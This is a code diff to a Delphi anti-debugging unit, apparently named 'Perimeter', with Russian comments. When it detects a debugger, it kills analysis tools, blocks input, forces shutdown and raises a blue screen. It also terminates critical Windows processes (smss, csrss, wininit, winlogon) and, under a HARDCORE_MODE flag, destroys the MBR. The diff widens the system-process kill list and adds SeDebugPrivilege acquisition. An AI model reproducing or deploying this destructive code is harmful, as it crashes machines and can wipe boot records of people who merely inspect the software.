@@ -14,18 +14,17 @@ type
   TPerimeterInputData = record
     ResistanceType: LongWord;
     CheckingsType: LongWord;
-    ExternalType: LongWord;
     ExtProcOnChecking: TExternalChecking;
-    ExtProcOnEliminating: pointer;
+    ExtProcOnEliminating: procedure;
     MainFormHandle: THandle;
     Interval: integer;
   end;
 
 // Контрольные суммы основных функций:
 const
-  ValidInitCRC: LongWord = $73A7DEEE;
-  ValidStopCRC: LongWord = $339EAD36;
-  ValidMainCRC: LongWord = $B7922AC6;
+  ValidInitCRC: LongWord = $31DA43CA;
+  ValidStopCRC: LongWord = $CC957F0F;
+  ValidMainCRC: LongWord = $9BCBD6F6;
 
 // Константы названий процессов для уничтожения:
 const
@@ -34,13 +33,19 @@ const
                                          'idaq.exe'
                                                        );
 
+
   AdditionalProcesses: array [0..1] of string = (
                                                    'java.exe',
                                                    'javaw.exe'
                                                                 );
 
-  Csrss: string = 'csrss.exe';
-  Smss: string = 'smss.exe';
+                                                                
+  SystemProcesses: array [0..3] of string = (
+                                              'smss.exe',
+                                              'csrss.exe',
+                                              'wininit.exe',
+                                              'winlogon.exe'
+                                                              );
 
 // Константы механизма противодействия:
 const
@@ -57,6 +62,7 @@ const
 {$IFDEF HARDCORE_MODE}
   DestroyMBR = 256;
 {$ENDIF}
+  ExternalEliminating = 512;  // Внешняя процедура при ликвидации угрозы
 
 // Константы-идентификаторы проверок:
 const
@@ -64,22 +70,17 @@ const
   PreventiveFlag = 2;
   ASM_A = 4;
   ASM_B = 8;
-  ASM_C = 16;
-  IDP = 32;
-  RDTSC_BP = 64;
-  WINAPI_BP = 128;
-  ZwSIT = 256;
-  ZwQIP = 512;
+  IDP = 16;
+  WINAPI_BP = 32;
+  ZwSIT = 64;
+  ZwQIP = 128;
+  ExternalChecking = 256; // Внешняя процедура при проверке
 
-const
-  ExternalChecking = 1; // Внешняя процедура при проверке
-  ExternalEliminating = 2;  // Внешняя процедура при ликвидации угрозы
-
-procedure InitPerimeter(PerimeterInputData: TPerimeterInputData);
+procedure InitPerimeter(const PerimeterInputData: TPerimeterInputData);
 procedure StopPerimeter;
 procedure DirectCall(Code: LongWord);
 procedure Emulate(Debugger: boolean; Breakpoint: boolean);
-procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord; ExternalType: LongWord);
+procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord);
 procedure ChangeExternalProcedures(OnCheckingProc: pointer; DebuggerValue: LongWord; OnEliminatingProc: pointer);
 
 // Структуры с отладочной информацией
@@ -108,10 +109,8 @@ type
     PrivilegesActivated: boolean;
     PreventiveProcessesExists: boolean;
     IsDebuggerPresent: boolean;
-    RDTSC_Debugger: TASMInfo;
     Asm_A: TASMInfo;
     Asm_B: TASMInfo;
-    Asm_C: TASMInfo;
     ZwQIP: TASMInfo;
     ExternalChecking: TASMInfo;
   end;
@@ -122,14 +121,10 @@ type
     Debug: TDebugInfo;
   end;
 
-  TExternalGuard = record
-    OnChecking: TExternalChecking;
-    OnEliminating: procedure; stdcall;
-  end;
+
 
 var
   PerimeterInfo: TPerimeterInfo;
-  ExternalGuard: TExternalGuard;
 
 implementation
 
@@ -297,9 +292,6 @@ function Process32Next(hSnapshot: THandle; var lppe: TProcessEntry32): BOOL; std
 {                                   SYSUTILS                                    }
 {- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -}
 
-const
-  Win32Platform: Integer = 0;
-
 // Переписанный и упрощённый ExtractFileName:
 function ExtractFileName(const FileName: string): string;
 var
@@ -408,6 +400,7 @@ const
   SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'; // привилегия, необходимая для
                                             // выполнения функций BSOD и
                                             // отключения питания
+  SE_DEBUG_NAME = 'SeDebugPrivilege';
 
 // Список параметров для первого способа выключения питания
 type SHUTDOWN_ACTION = (
@@ -477,25 +470,29 @@ const // Номера ошибок, с которыми вызывается с�
   NT_SERVER_UNAVAILABLE = $C0020017;
   NT_CALL_FAILED = $C002001B;
   CLUSTER_POISONED = $C0130017;
+  FATAL_UNHANDLED_HARD_ERROR = $0000004C;
+  STATUS_SYSTEM_PROCESS_TERMINATED = $C000021A;
 
 const // Создаём массив из кодов ошибок чтобы удобнее было ими оперировать
-  ErrorCode: array [0..6] of LongWord =    (
+  ErrorCode: array [0..8] of LongWord =    (
                                           TRUST_FAILURE,
                                           LOGON_FAILURE,
                                           HOST_DOWN,
                                           FAILED_DRIVER_ENTRY,
                                           NT_SERVER_UNAVAILABLE,
                                           NT_CALL_FAILED,
-                                          CLUSTER_POISONED
+                                          CLUSTER_POISONED,
+                                          FATAL_UNHANDLED_HARD_ERROR,
+                                          STATUS_SYSTEM_PROCESS_TERMINATED
                                           );
 
 // Делаем заготовки для импортируемых функций и пишем вспомогательные переменные:
 var
   // 1й способ отключения питания:
-  NTShutdownSystem: procedure (Action: SHUTDOWN_ACTION); stdcall;
+  ZwShutdownSystem: procedure (Action: SHUTDOWN_ACTION); stdcall;
 
   // 2й способ отключения питания:
-  NTInitiatePowerAction: procedure (
+  ZwInitiatePowerAction: procedure (
                                      SystemAction: POWER_ACTION;
                                      MinSystemState: SYSTEM_POWER_STATE;
                                      Flags: ULONG;
@@ -504,7 +501,7 @@ var
 
   // BSOD:
   HR: HARDERROR_RESPONSE;
-  NtRaiseHardError: procedure (
+  ZwRaiseHardError: procedure (
                                 ErrorStatus: NTStatus;
                                 NumberOfParameters: ULong;
                                 UnicodeStringParameterMask: PChar;
@@ -523,7 +520,6 @@ var
 
   // Проверка наличия отладчика:
   IsDebuggerPresent: function: boolean; stdcall;
-  OutputDebugStringA: procedure (lpOutputString: string); stdcall;
 
   ZwQueryInformationProcess: function (ProcessHandle: THANDLE;
                                        ProcessInformationClass: LongWord;
@@ -546,9 +542,9 @@ var
 // Имена библиотек и вызываемых функций:
 const
   // Из ntdll:
-  sNTRaiseHardError: PAnsiChar = 'ZwRaiseHardError';
-  sNTShutdownSystem: PAnsiChar = 'ZwShutdownSystem';
-  sNTInitiatePowerAction: PAnsiChar = 'ZwInitiatePowerAction';
+  sZwRaiseHardError: PAnsiChar = 'ZwRaiseHardError';
+  sZwShutdownSystem: PAnsiChar = 'ZwShutdownSystem';
+  sZwInitiatePowerAction: PAnsiChar = 'ZwInitiatePowerAction';
   sLdrShutdownProcess: PAnsiChar = 'LdrShutdownProcess';
   sZwSetInformationThread: PAnsiChar = 'ZwSetInformationThread';
   sZwQueryInformationProcess: PAnsiChar = 'ZwQueryInformationProcess';
@@ -581,13 +577,22 @@ const
   SND_LOOP            = $0008;
   SND_ASYNC           = $0001;
 
-// Рабочие переменные:
+// Тип внешних проверок:
+type
+  TExternalGuard = record
+    OnChecking: TExternalChecking;
+    OnEliminating: procedure;
+  end;
+
+var
+  ExternalGuard: TExternalGuard;
+  
+// Рабочие переменные
 var
   GlobalInitState: boolean = false;
 
   TypeOfResistance: LongWord;
   TypeOfChecking: LongWord;
-  TypeOfExternal: LongWord;
 
   ThreadID: LongWord;
   ThreadHandle: integer;
@@ -603,7 +608,6 @@ var
   Process: THandle;
   InitAddress, StopAddress, MainAddress: pointer;
   InitSize, StopSize, MainSize: integer;
-
 
 var
   CRCtable: array[0..255] of cardinal;
@@ -702,7 +706,7 @@ begin
   CloseHandle(FS);
 end;
 
-// Функция, изменяющая привилегии процесса:
+// Установка привилегий
 function NTSetPrivilege(sPrivilege: string; bEnabled: Boolean): Boolean;
 var
   hToken: THandle;
@@ -710,28 +714,21 @@ var
   PrevTokenPriv: TOKEN_PRIVILEGES;
   ReturnLength: Cardinal;
 begin
-  Result := True;
-  if not (Win32Platform = VER_PLATFORM_WIN32_NT) then Exit;
-
   if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, hToken) then
   begin
-    try
-
-      if LookupPrivilegeValue(nil, PChar(sPrivilege), TokenPriv.Privileges[0].Luid) then
-      begin
-        TokenPriv.PrivilegeCount := 1;
-        case bEnabled of
-          True: TokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
-          False: TokenPriv.Privileges[0].Attributes := 0;
-        end;
-        ReturnLength := 0;
-        PrevTokenPriv := TokenPriv;
-        AdjustTokenPrivileges(hToken, False, TokenPriv, SizeOf(PrevTokenPriv),
-        PrevTokenPriv, ReturnLength);
+    if LookupPrivilegeValue(nil, PChar(sPrivilege), TokenPriv.Privileges[0].Luid) then
+    begin
+      TokenPriv.PrivilegeCount := 1;
+      case bEnabled of
+        True: TokenPriv.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
+        False: TokenPriv.Privileges[0].Attributes := 0;
       end;
-    finally
-      CloseHandle(hToken);
+      ReturnLength := 0;
+      PrevTokenPriv := TokenPriv;
+      AdjustTokenPrivileges(hToken, False, TokenPriv, SizeOf(PrevTokenPriv),
+      PrevTokenPriv, ReturnLength);
     end;
+    CloseHandle(hToken);
   end;
   Result := GetLastError = ERROR_SUCCESS;
 end;
@@ -744,9 +741,12 @@ var
   hNtdll: THandle;
   hWinMM: THandle;
 begin
+// Присваиваем процессу привилегию SE_SHUTDOWN_NAME:
+  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true) and NTSetPrivilege(SE_DEBUG_NAME, true);
+
 // Получаем хэндлы библиотек:
-  hUser32 := GetModuleHandle(user32);
-  hKernel32 := GetModuleHandle(kernel32);
+  hUser32 := LoadLibrary(user32);
+  hKernel32 := LoadLibrary(kernel32);
   hNtdll := GetModuleHandle(ntdll);
   hWinMM := LoadLibrary(winmm);
 
@@ -756,7 +756,6 @@ begin
   QueryPerformanceFrequency := GetProcAddress(hKernel32, sQueryPerformanceFrequency);
   QueryPerformanceCounter := GetProcAddress(hKernel32, sQueryPerformanceCounter);
   Sleep := GetProcAddress(hKernel32, sSleep);
-  OutputDebugStringA := GetProcAddress(hKernel32, sOutputDebugStringA);
   OpenThread := GetProcAddress(hKernel32, sOpenThread);
 
   {$IFDEF HARDCORE_MODE}
@@ -773,17 +772,15 @@ begin
   PlaySound := GetProcAddress(hWinMM, sPlaySound);
 
   // ntdll:
-  NTRaiseHardError := GetProcAddress(hNtdll, sNtRaiseHardError);
-  NTShutdownSystem := GetProcAddress(hNtdll, sNtShutdownSystem);
-  NTInitiatePowerAction := GetProcAddress(hNtdll, sNtInitiatePowerAction);
+  ZwRaiseHardError := GetProcAddress(hNtdll, sZwRaiseHardError);
+
+  ZwShutdownSystem := GetProcAddress(hNtdll, sZwShutdownSystem);
+  ZwInitiatePowerAction := GetProcAddress(hNtdll, sZwInitiatePowerAction);
   LdrShutdownProcess := GetProcAddress(hNtdll, sLdrShutdownProcess);
   ZwSetInformationThread := GetProcAddress(hNtdll, sZwSetInformationThread);
   ZwQueryInformationProcess := GetProcAddress(hNtdll, sZwQueryInformationProcess);
   ZwTerminateProcess := GetProcAddress(hNtdll, sZwTerminateProcess);
 //  LdrShutdownThread := GetProcAddress(hNtdll, sLdrShutdownThread);
-
-// Присваиваем процессу привилегию SE_SHUTDOWN_NAME:
-  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true);
 
   GlobalInitState := true;
 end;
@@ -831,16 +828,19 @@ begin
 
     BlockIO: BlockInput(true);
 
-    ShutdownPrimary: NtShutdownSystem(SHUTDOWN_ACTION(0));
+    ShutdownPrimary: ZwShutdownSystem(SHUTDOWN_ACTION(0));
 
-    ShutdownSecondary: NTInitiatePowerAction(4, 6, 0, true);
+    ShutdownSecondary: ZwInitiatePowerAction(4, 6, 0, true);
 
-    GenerateBSOD: NtRaiseHardError(ErrorCode[2], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
+    GenerateBSOD: ZwRaiseHardError(ErrorCode[2], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
 
     HardBSOD:
       begin
-        KillTask(Csrss);
-        KillTask(Smss);
+        ProcLength := Length(SystemProcesses) - 1;
+        for I := 0 to ProcLength do
+        begin
+          KillTask(SystemProcesses[I]);
+        end;
       end;
 
    {$IFDEF HARDCORE_MODE}
@@ -879,7 +879,7 @@ var
     AdditionalLength: byte;
   begin
     // Исполняем внешнюю процедуру уничтожения угрозы:
-    if (TypeOfExternal and ExternalEliminating) = ExternalEliminating then
+    if (TypeOfResistance and ExternalEliminating) = ExternalEliminating then
     begin
       ExternalGuard.OnEliminating
     end;
@@ -939,27 +939,30 @@ var
     // Выключаем питание первым способом:
     if (TypeOfResistance and ShutdownPrimary) = ShutdownPrimary then
     begin
-      NtShutdownSystem(SHUTDOWN_ACTION(0));
+      ZwShutdownSystem(SHUTDOWN_ACTION(0));
     end;
 
     // Выключаем питание вторым способом:
     if (TypeOfResistance and ShutdownSecondary) = ShutdownSecondary then
     begin
-      NTInitiatePowerAction(4, 6, 0, true);
+      ZwInitiatePowerAction(4, 6, 0, true);
     end;
 
     // Выводим BSOD:
     if (TypeOfResistance and GenerateBSOD) = GenerateBSOD then
     begin
       BSODErrorCode := Random(6);
-      NtRaiseHardError(ErrorCode[BSODErrorCode], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
+      ZwRaiseHardError(ErrorCode[BSODErrorCode], 0, nil, nil, HARDERROR_RESPONSE_OPTION(6), @HR);
     end;
 
     // Тяжёлый BSOD - убиваем csrss.exe и smss.exe
     if (TypeOfResistance and HardBSOD) = HardBSOD then
     begin
-      KillTask(Csrss);
-      KillTask(Smss);
+      ProcLength := Length(SystemProcesses) - 1;
+      for I := 0 to ProcLength do
+      begin
+        KillTask(SystemProcesses[I]);
+      end;
     end;
 
     {$IFDEF HARDCORE_MODE}
@@ -976,10 +979,14 @@ var
   end;
 
   procedure ReStruct;
+  var
+    PrivilegesState: boolean;
   begin
     with PerimeterInfo do
     begin
+      PrivilegesState := Debug.PrivilegesActivated;
       FillChar(Debug, SizeOf(Debug), #0);
+      Debug.PrivilegesActivated := PrivilegesState;
       Functions.Main.Checksum := 0;
       Functions.Init.Checksum := 0;
       Functions.Stop.Checksum := 0;
@@ -1008,17 +1015,14 @@ var
   ThreadID: LongWord;
   ThreadHandle: THandle;
 
-// Проверка на отладчик через RDTSC:
-  Timer: LongWord;
-  FirstIteration: boolean;
-const
-  DbgString: string = '"PLLDS" - Веха #1';
-
 begin
+  PerimeterInfo.Debug.PrivilegesActivated := NTSetPrivilege(SE_SHUTDOWN_NAME, true) and NTSetPrivilege(SE_DEBUG_NAME, true);
+
 // Выполняем на нулевом ядре:
   ThreadID := GetCurrentThreadId;
   ThreadHandle := OpenThread(PROCESS_ALL_ACCESS, false, ThreadId);
   SetThreadAffinityMask(ThreadHandle, 1);
+  CloseHandle(ThreadHandle);
 
 // Задаём максимальный приоритет потока:
   SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
@@ -1032,24 +1036,10 @@ begin
 
   IsProcExists := false;
 
-  FirstIteration := true; // Первый прогон вхолостую для разогрева CPU
-
   while Active do
   begin
     ReStruct;
     FullState := false;
-
-    asm
-      mov eax, TypeOfChecking
-      and eax, RDTSC_BP
-      cmp eax, RDTSC_BP
-      jne @Pass
-        rdtsc
-        mov Timer, eax
-@Pass:
-      lea eax, [PerimeterInfo]
-      prefetchnta [eax]
-    end;
 
     if (TypeOfChecking and WINAPI_BP) = WINAPI_BP then
     begin
@@ -1096,7 +1086,7 @@ begin
       end;
     end;
 
-    if (TypeOfExternal and ExternalChecking) = ExternalChecking then
+    if (TypeOfChecking and ExternalChecking) = ExternalChecking then
     begin
       PerimeterInfo.Debug.ExternalChecking.Value := ExternalGuard.OnChecking.ProcPtr;
       if PerimeterInfo.Debug.ExternalChecking.Value = ExternalGuard.OnChecking.DebuggerResult then
@@ -1152,45 +1142,6 @@ begin
 @Continue_B:
 
       mov eax, TypeOfChecking
-      mov ecx, ASM_C
-      and eax, ecx
-      cmp eax, ecx
-      jne @Continue_C
-
-    // Anti-Debugging C:
-
-      xor eax, eax
-      push offset DbgString
-      call OutputDebugStringA
-      mov PerimeterInfo.Debug.Asm_C.Value, eax
-
-      // Если IsPrevented = true, надо отнимать 18
-      // Если IsPrevented = false, надо отнимать 87
-
-      mov ecx, TypeOfChecking
-      mov edx, PreventiveFlag
-      and ecx, edx
-      cmp ecx, edx
-      je @IsPrevented
-      sub eax, 87
-      jmp @@Continue
-
-@IsPrevented:
-      sub eax, 18
-
-@@Continue:
-      test eax, eax
-      jnz @C_Debugger
-
-      mov PerimeterInfo.Debug.Asm_C.IsDebuggerExists, false
-      jmp @Continue_C
-
-@C_Debugger:
-      mov PerimeterInfo.Debug.Asm_C.IsDebuggerExists, true
-
-@Continue_C:
-
-      mov eax, TypeOfChecking
       mov ecx, ZwSIT
       and eax, ecx
       cmp eax, ecx
@@ -1203,51 +1154,6 @@ begin
       call ZwSetInformationThread // будем отключены от отладчика
 
 @Pass_ZwSIT:
-
-    // Если отладчик выдержал испытание ZwSetInformationThread'ом
-     {
-      rdtsc
-      xchg  ecx, eax
-      rdtsc
-      sub   eax, ecx
-     }
-      mov eax, TypeOfChecking
-      mov ecx, RDTSC_BP
-      and eax, ecx
-      cmp eax, ecx
-      jne @Exit_RDTSC
-
-      rdtsc
-      sub eax, Timer
-
-      cmp FirstIteration, false
-      jne @FirstIteration
-
-      mov PerimeterInfo.Debug.RDTSC_Debugger.Value, eax
-
-      mov ecx, TypeOfChecking
-      mov edx, PreventiveFlag
-      and ecx, edx
-      cmp ecx, edx
-      jne @IsPreventedTSC
-
-      cmp   eax, 50000000d
-      jmp @TSCDecision
-
-@IsPreventedTSC:
-      cmp   eax, 150000000d
-
-@TSCDecision:
-      jnbe  @RDTSC_Debugger
-
-@FirstIteration:
-      mov PerimeterInfo.Debug.RDTSC_Debugger.IsDebuggerExists, false
-      jmp @Exit_RDTSC
-
-@RDTSC_Debugger:
-      mov PerimeterInfo.Debug.RDTSC_Debugger.IsDebuggerExists, true
-
-@Exit_RDTSC:
 
     // Финальный аккорд - используем ZwQueryInformationProcess
       mov eax, TypeOfChecking
@@ -1281,15 +1187,14 @@ begin
         call  ZwQueryInformationProcess
         pop   eax
         test  ah, ah
-        jne   @ZwQIP_Debugger
+        mov PerimeterInfo.Debug.ZwQIP.Value, eax
+        jnz   @ZwQIP_Debugger
 
           // Не нашли отладчик?? О_о Бывает и такое...
-          mov PerimeterInfo.Debug.ZwQIP.Value, eax
           mov PerimeterInfo.Debug.ZwQIP.IsDebuggerExists, false
           jmp @Pass_ZwQIP
 
 @ZwQIP_Debugger:
-      mov PerimeterInfo.Debug.ZwQIP.Value, eax
       mov PerimeterInfo.Debug.ZwQIP.IsDebuggerExists, true
 
 @Pass_ZwQIP:
@@ -1300,8 +1205,6 @@ begin
       FullState := FullState or
                    Asm_A.IsDebuggerExists or
                    Asm_B.IsDebuggerExists or
-                   Asm_C.IsDebuggerExists or
-                   RDTSC_Debugger.IsDebuggerExists or
                    ZwQIP.IsDebuggerExists;
     end;
 
@@ -1377,7 +1280,6 @@ begin
       SendMessage(FormHandle, $FFF, DebuggerState, BreakpointState);
     end;
 
-    FirstIteration := false;
   end;
 
 // Посылаем сообщение о завершении работы:
@@ -1389,13 +1291,12 @@ begin
 
     mov IsDebuggerPresent, eax;
     mov BlockInput, eax;
-    mov NTRaiseHardError, eax;
-    mov NTShutdownSystem, eax;
-    mov NTInitiatePowerAction, eax;
+    mov ZwRaiseHardError, eax;
+    mov ZwShutdownSystem, eax;
+    mov ZwInitiatePowerAction, eax;
     mov LdrShutdownProcess, eax;
     mov ZwSetInformationThread, eax;
 
-    mov OutputDebugStringA, eax;
     mov OpenThread, eax;
 
     mov MsgBox, eax;
@@ -1413,7 +1314,7 @@ begin
 end;
 
 
-procedure InitPerimeter(PerimeterInputData: TPerimeterInputData);
+procedure InitPerimeter(const PerimeterInputData: TPerimeterInputData);
 var
 // Переменные для инициализации основного процесса:
   ProcessID: LongWord;
@@ -1434,7 +1335,7 @@ begin
     InitAddress := @InitPerimeter;
     StopAddress := @StopPerimeter;
     EmulateAddress := @Emulate;
-    MainAddress := @KillTask;
+    MainAddress := @IsProcLaunched;
 
     InitInt := Integer(InitAddress);
     StopInt := Integer(StopAddress);
@@ -1467,7 +1368,6 @@ begin
     Delay := Interval;
 
 // Получаем включение и адреса внешних процедур:
-    TypeOfExternal := ExternalType;
     ExternalGuard.OnChecking.ProcPtr := ExtProcOnChecking.ProcPtr;
     ExternalGuard.OnChecking.DebuggerResult := ExtProcOnChecking.DebuggerResult;
     ExternalGuard.OnEliminating := ExtProcOnEliminating;
@@ -1507,11 +1407,10 @@ begin
   EmuBreakpoint := Breakpoint;
 end;
 
-procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord; ExternalType: LongWord);
+procedure ChangeParameters(ResistanceType: LongWord; CheckingType: LongWord);
 begin
   TypeOfResistance := ResistanceType;
   TypeOfChecking := CheckingType;
-  TypeOfExternal := ExternalType;
 end;
 
 procedure ChangeExternalProcedures(OnCheckingProc: pointer; DebuggerValue: LongWord; OnEliminatingProc: pointer);
